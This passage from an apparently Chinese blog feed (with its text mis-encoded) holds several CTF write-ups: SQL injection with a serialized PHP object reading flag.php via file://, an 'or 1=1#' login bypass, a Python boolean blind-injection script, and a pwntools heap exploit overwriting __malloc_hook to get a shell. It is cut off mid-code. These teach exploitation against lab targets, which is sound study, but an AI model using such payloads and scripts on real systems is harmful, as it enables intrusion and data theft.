class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"L"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> "file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}</span></code></pre><p>æ„é€ sqlè¯­å¥å¦‚ä¸‹</p><pre class=" language-bash"><code class="language-bash">http://6258afff-db8c-4caf-affd-0f454a1f7cde.node3.buuoj.cn/view.php?no<span class="token operator">=</span>-1/**/union/**/select/**/1,2,3,<span class="token string">'O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'</span>--+</code></pre><p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/10.jpg" alt=""><br>æŸ¥çœ‹é¡µé¢æºä»£ç <br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/11.jpg" alt=""><br>æœ‰ä¸€ä¸²base64å­—ç¬¦ä¸²ï¼Œè§£ç <br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/12.jpg" alt=""><br>å¾—åˆ°flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHPååºåˆ—åŒ– </tag>
            
            <tag> æŠ¥é”™æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œç™»å½•æ¡†<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/1.jpg" alt=""><br>éšä¾¿ç™»é™†æµ‹è¯•ä¸€ä¸‹</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/2.jpg" alt=""><br>ä¸å‡ºæ„å¤–çš„å¤±è´¥<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/3.jpg" alt=""><br>ç™»é™†æ¡†çš„sqlè¯­å¥å¤§æ¦‚å°±æ˜¯<br><code>select * from table where username='$username' and password='$password'</code><br>é‚£ä¹ˆä¸‡èƒ½å¯†ç å…ˆèµ°ä¸€æ³¢<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/4.jpg" alt=""><br>æ„é€ æˆ<br><code>select * from table where username='admin' or 1=1#' and password='123'</code><br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/5.jpg" alt=""><br>æˆåŠŸ</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> sqlä¸‡èƒ½å¯†ç  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/1.jpg" alt=""></p><a id="more"></a><p>æŸ¥çœ‹æºä»£ç ï¼Œåœ¨æœ€æœ«ç«¯å‘ç°æç¤º<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/3.jpg" alt=""><br>åŸºç¡€ï¼Œä¼ å‚cat=dogå³å¯<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/4.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack World</title>
      <link href="/LawlietLW.github.io/2020/02/09/hack-world/"/>
      <url>/LawlietLW.github.io/2020/02/09/hack-world/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯sqlæ³¨å…¥<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/1.jpg" alt=""><br>è¾“å…¥å‡ ä¸ªæ•°å­—æµ‹è¯•ä¸€ä¸‹</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/02/09/hack-world/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/3.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/4.jpg" alt=""><br>3ä»¥åå°±æ²¡æœ‰ä¸åŒçš„å›æ˜¾äº†<br>æ¥ç€æµ‹è¯•å•å¼•å·ï¼Œè¾“å…¥1â€™æµ‹è¯•<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/5.jpg" alt=""><br>å›æ˜¾<code>bool(false)</code><br>çœ‹åˆ°boolè‡ªç„¶å°±æƒ³åˆ°boolç›²æ³¨ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜å¾—fuzzä¸€ä¸‹è¿‡æ»¤äº†å“ªäº›å…³é”®å­—ï¼Œç›´æ¥ä¸Šbpæµ‹è¯•<br>é•¿åº¦ä¸º472çš„éƒ½æ˜¯boolï¼Œé•¿åº¦ä¸º482çš„éƒ½è¢«æ¢æµ‹ä¸ºsqlæ³¨å…¥<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/8.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°å¤§éƒ¨åˆ†æ³¨å…¥éœ€è¦çš„å‡½æ•°éƒ½æ²¡æœ‰è¢«è¿‡æ»¤<br>æ¥ä¸‹æ¥å°±å¼€å§‹æ„é€ payloadæ³¨å…¥<br>é¢˜ç›®å·²ç»å‘Šè¯‰æˆ‘ä»¬flagæ‰€åœ¨çš„è¡¨å’Œåˆ—éƒ½ä¸ºflag<br>æˆ‘ä»¬æ„é€ å¦‚ä¸‹payloadæƒŠé†’æµ‹è¯•<br><code>if(ascii(substr((select(flag)from(flag)),1,1))=102,1,2)--+</code><br>å¦‚æœä¸ºçœŸåˆ™è¿”å›id=1çš„ç»“æœï¼Œå¦åˆ™è¿”å›id=2çš„ç»“æœ<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/9.jpg" alt=""><br>å¦‚é¢„æœŸä¸€æ ·ï¼Œå›æ˜¾äº†id=1çš„ç»“æœ<br>å‰©ä¸‹çš„å°±æ˜¯æ„é€ ç›²æ³¨è„šæœ¬äº†ï¼Œè„šæœ¬å¯ä»¥ç”¨äºŒåˆ†æ³•ï¼Œè¿™æ ·å¿«å¾ˆå¤š<br>ä¸è¿‡æˆ‘æ‡’ï¼Œé€‰æ‹©æš´åŠ›æšä¸¾ï¼Œè„šæœ¬å¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://8c21b6a5-81a5-4dc0-ac52-8db6ef8583f4.node3.buuoj.cn/index.php"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span>            <span class="token string">"id"</span><span class="token punctuation">:</span>payload        <span class="token punctuation">}</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Hello'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flagä¸º:"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/09/hack-world/10.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
            <tag> boolç›²æ³¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/"/>
      <url>/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸¤å¤©å­¦ä¹ äº†ä¸€äº›å †çš„çŸ¥è¯†ï¼Œè¶çƒ­è®°å½•ä¸€ä¸‹<br>é¦–å…ˆè¿˜æ˜¯ç†Ÿç»ƒçš„checksec<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/1.jpg" alt=""></p><a id="more"></a><p>ä¿æŠ¤å…¨å¼€ï¼Œå †é¢˜æ­£å¸¸æ“ä½œ<br>IDAåˆ†æä¸€æ³¢<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/2.jpg" alt=""><br>å››ä¸ªåŠŸèƒ½ï¼Œå¢åˆ æŸ¥æ”¹<br>ä¾æ¬¡è¿›å…¥æ¯ä¸ªåŠŸèƒ½æŸ¥çœ‹ï¼Œé¦–å…ˆæ˜¯AllocateåŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/3.jpg" alt=""><br>æœ€å¤§åˆ†é…16ä¸ª<br>sizeæœ€å¤§ä¸º4096ä¸ªå­—èŠ‚ï¼Œé€šè¿‡callocåˆ†é…å †ï¼Œcallocä¸mallocçš„åŒºåˆ«åœ¨äº<br>calloc ä¼šå°†åˆ†é…çš„å†…å­˜ç©ºé—´æ¯ä¸€ä½éƒ½åˆå§‹åŒ–ä¸º0<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/4.jpg" alt=""><br>è¿™ä¸‰è¡Œä»£ç åˆ†åˆ«ä»£è¡¨flagä½ï¼Œåˆ†é…å³è¢«ç½®1ï¼›åˆ†é…çš„å­—èŠ‚å¤§å°ï¼›æ‰€åˆ†é…çš„å †çš„æŒ‡é’ˆ<br>æ‰€ä»¥è½¬æ¢æˆç»“æ„ä½“å³ä¸º</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag<span class="token punctuation">;</span>    <span class="token keyword">int</span> lenth<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span>content<span class="token punctuation">;</span><span class="token punctuation">}</span>note<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span></code></pre><p>å†çœ‹åˆ°FillåŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/5.jpg" alt=""><br>é¦–å…ˆåˆ¤æ–­è¾“å…¥çš„indexæ˜¯å¦ä½äº0åˆ°15ä¹‹é—´å¹¶ä¸”æ˜¯å¦è¢«åˆ†é…<br>å¦‚æœæ˜¯çš„è¯åˆ™è¾“å…¥contentçš„size<br>æ¼æ´ç‚¹å°±åœ¨è¿™é‡Œï¼Œç¨‹åºå¹¶æ²¡æœ‰åˆ¤æ–­contentçš„sizeæ˜¯å¦å°äºæˆ‘ä»¬ä¹‹å‰è¾“å…¥çš„å †çš„sizeï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥æ›´å¤§çš„sizeï¼Œå°±å¯ä»¥é€ æˆå †æº¢å‡º</p><p>å†çœ‹åˆ°FreeåŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/6.jpg" alt=""><br>ä¸€å¼€å§‹è¿˜æ˜¯å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨<br>ç„¶åæ¸…é›¶æ‰€æœ‰çš„æ•°æ®ï¼Œå¹¶ä¸”æŒ‡é’ˆä¹Ÿç½®NULL<br>freeåŠŸèƒ½å¹¶æ²¡æœ‰æ¼æ´</p><p>æœ€åä¸€ä¸ªdumpåŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/7.jpg" alt=""><br>å’Œä¸Šé¢ä¸€æ ·ï¼Œå…ˆåˆ¤æ–­ï¼Œç„¶åæ‰“å°å¯¹åº”åºå·çš„å †çš„å†…å®¹ï¼Œæ²¡å•¥é—®é¢˜</p><p>åŠŸèƒ½åˆ†æå®Œåå°±å¼€å§‹åˆ†ææ¼æ´ç‚¹<br>FillåŠŸèƒ½å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œè€ŒfreeåŠŸèƒ½æ—¢æ²¡æœ‰UAFæ¼æ´ä¹Ÿæ²¡æœ‰double freeæ¼æ´ï¼Œæ‰€ä»¥è¿™é¢˜ä¸èƒ½åˆ©ç”¨å¸¸è§„çš„é€šè¿‡unsorted binæ¥æ³„éœ²libcåœ°å€çš„æ–¹æ³•ï¼Œè€Œæ˜¯è¦åˆ©ç”¨fastbin attackä¸­çš„ä¸€ç§å«åšchunk extendçš„æ–¹æ³•æ¥æ³„éœ²åœ°å€ï¼Œåœ¨è¿™é‡Œè´´ä¸Šæˆ‘çœ‹åˆ°çš„ä¸€ä¸ªè®²è§£çš„å¾ˆå¥½çš„é“¾æ¥<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">fastbin attackè¯¦è§£</a><br>é¦–å…ˆæŠŠé‡å¤æ“ä½œå°è£…æˆå‡½æ•°</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: \n"</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data</code></pre><p>åœ¨æœ¬é¢˜ä¸­ï¼ŒæŒ‰ç…§æ”»å‡»æ€æƒ³ï¼Œé¦–å…ˆalloc4ä¸ªå †</p><pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span></code></pre><p>alloc0x18å®é™…ä¸Šåˆ†é…äº†0x20å¤§å°çš„å †ï¼Œalloc0x68å®é™…ä¸Šåˆ†é…äº†0x70å¤§å°çš„å †<br>ç„¶åæˆ‘ä»¬fill0å·å †ï¼Œé€ æˆå•å­—èŠ‚æº¢å‡ºï¼Œå³æº¢å‡ºåˆ°1å·å †çš„sizeä½ï¼Œä¿®æ”¹sizeä¸ºsize(1)+size(2)ï¼Œå³0xe1(1ä¸ºä¸Šä¸€ä¸ªå †æ˜¯å¦å¤„äºåˆ†é…çŠ¶æ€çš„æ ‡å¿—ä½)</p><pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>è¿™æ ·1å·å †å®é™…ä¸Šå°±åŒ…æ‹¬äº†1å·å †å’Œ2å·å †ï¼Œå±äºsmall chunk.æ¥ä¸‹æ¥æˆ‘ä»¬free1å·å †ï¼Œå½“1å·å †è¢«freeä¹‹åï¼ŒæŒ‰ç…§è§„å®šä¼šè¢«æ”¾å…¥unsorted binå½“ä¸­ï¼Œå¤§å°ä¸º0xe1,æ­¤æ—¶1å·å †çš„fdå’ŒbkæŒ‡é’ˆéƒ½å­˜æ”¾ç€unsorted binçš„è¡¨å¤´<br>(éœ€è¦æ³¨æ„ï¼Œfreeæ‰1å·å †åï¼Œå®é™…ä¸Š2å·å †ä»ç„¶å¤„äºå·²åˆ†é…çŠ¶æ€)<br>ç„¶åæˆ‘ä»¬å†allocä¸€ä¸ªå¤§å°ä¸º0x60çš„å †ï¼Œè¿™æ ·å°±ä»unsorted binå½“ä¸­å‰²é™¤ä¸€å—ï¼Œå³å‰²é™¤äº†åŸæœ¬å±äº1å·å †çš„é‚£ä¸€å—åˆ†é…ç»™äº†æ–°å †ï¼Œå‰©ä¸‹çš„é‚£ä¸€å—å°±æ˜¯å±äº2å·å †çš„é‚£ä¸€å—ï¼Œunsorted binçš„è¡¨å¤´çš„è½¬ç§»åˆ°äº†2å·å †çš„fdå’Œbkå½“ä¸­<br>è€Œ2å·å †ä»ç„¶å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡dumpæ“ä½œæ³„éœ²å‡ºlibc</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/8.jpg" alt=""><br>åç§»ä¸º0x7f5a68c3db78-0x7f5a68879000=0x3C4B78â€¬</p><pre class=" language-python"><code class="language-python">libc<span class="token operator">=</span>leak<span class="token number">-0x3c4b78</span>__malloc_hook<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x3c4b10</span>one_gadget<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"leak => 0x%x"</span> <span class="token operator">%</span> leak<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc => 0x%x"</span> <span class="token operator">%</span> libc<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"__malloc_hook => 0x%x"</span> <span class="token operator">%</span> __malloc_hook<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"one_gadget => 0x%x"</span> <span class="token operator">%</span> one_gadget<span class="token punctuation">)</span></code></pre><p>æ³„éœ²å‡ºlibcåœ°å€åï¼Œåˆ©ç”¨å°±å·²ç»å®Œæˆäº†ä¸€å¤§åŠäº†<br>ç”±äºå¼€å¯äº†Full RELROï¼Œå¤å†™gotè¡¨å°±ä¸å¯è¡Œäº†ï¼Œæˆ‘ä»¬è¿™é‡Œå¯é€šè¿‡è¦†ç›–__malloc_hookæŒ‡é’ˆä¸ºone_gadgetæ¥èµ·shell</p><pre class=" language-bash"><code class="language-bash">malloc_hookæœ€å¸¸è§ä¹Ÿæ˜¯æœ€å®¹æ˜“çš„ä¸€ç§å †åˆ©ç”¨æ–¹æ³•ã€‚mallocå‡½æ•°ä¼šé¦–å…ˆæ£€æŸ¥malloc_hookçš„å€¼ï¼Œè‹¥ä¸ä¸º0åˆ™ä¼šè°ƒç”¨ä»–ã€‚è‹¥æˆ‘ä»¬èƒ½é€šè¿‡å†…å­˜å†™å…¥malloc_hookå³å¯å®ç°ä»»æ„åœ°å€è·³è½¬é€šè¿‡fastbin_attackæ”»å‡»malloc_hook</code></pre><p>è§‚å¯Ÿä¸€ä¸‹malloc_hookå‘¨å›´çš„æ•°æ®çš„åˆ†å¸ƒ<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/9.jpg" alt=""><br>ä¼¼ä¹å¹¶æ²¡æœ‰æ»¡è¶³æ¡ä»¶fastbinæ¡ä»¶çš„æ•°æ®ï¼Œä½†åªè¦æˆ‘ä»¬ç¨å¾®è°ƒæ•´ä¸€ä¸‹æ•°æ®åˆ†å¸ƒï¼Œçœ‹åˆ°__malloc_hook-0x23<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/10.jpg" alt=""><br>7fæ­£å¥½æ»¡è¶³fastbinå¤§å°çš„é™åˆ¶ï¼Œå¦‚å›¾æ‰€ç¤º<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/11.jpg" alt=""><br>è¡¥å……å¥½ç›¸åº”çš„çŸ¥è¯†ä»¥åï¼Œå°±å¯ä»¥å¼€å§‹æ„é€ äº†<br>æˆ‘ä»¬å†allocä¸€ä¸ª0x60å¤§å°çš„4å·å †ï¼Œå®é™…ä¸Š4å·å †å’Œ2å·å †æ˜¯å…¬ç”¨çš„<br>ç„¶åfreeæ‰2å·å †ï¼Œè¿™ä¸ªæ—¶å€™binså¦‚ä¸‹<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/12.jpg" alt=""><br>æˆ‘ä»¬å†é€šè¿‡fill4å·å †æŠŠ2å·å †çš„fdæŒ‡é’ˆæŒ‡å‘mallac_hook-0x23å¤„</p><pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>çœ‹çœ‹ç°åœ¨çš„bins<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/13.jpg" alt=""><br>æŒ‡å‘äº†<strong>malloc_hook-0x23å¤„ï¼Œæˆ‘ä»¬åªéœ€è¦alloc2æ¬¡ï¼Œå°±èƒ½æŠŠå †åˆ†é…åˆ°</strong>malloc_hook-0x23</p><pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span></code></pre><p>æ¥ä¸‹æ¥å°±åªéœ€è¦æŒ‰ç…§ä¸Šé¢å…³äºçš„<strong>malloc_hookçš„å›¾è¿›è¡Œå¡«å……å³å¯ï¼ŒæŠŠone_gadgetçš„åœ°å€å¡«å…¥</strong>malloc_hookå¤„ï¼Œç„¶åå†allocä»»æ„å¤§å°çš„å †å³å¯è§¦å‘one_gadgetä»è€Œæ‹¿åˆ°shell</p><pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">5</span><span class="token 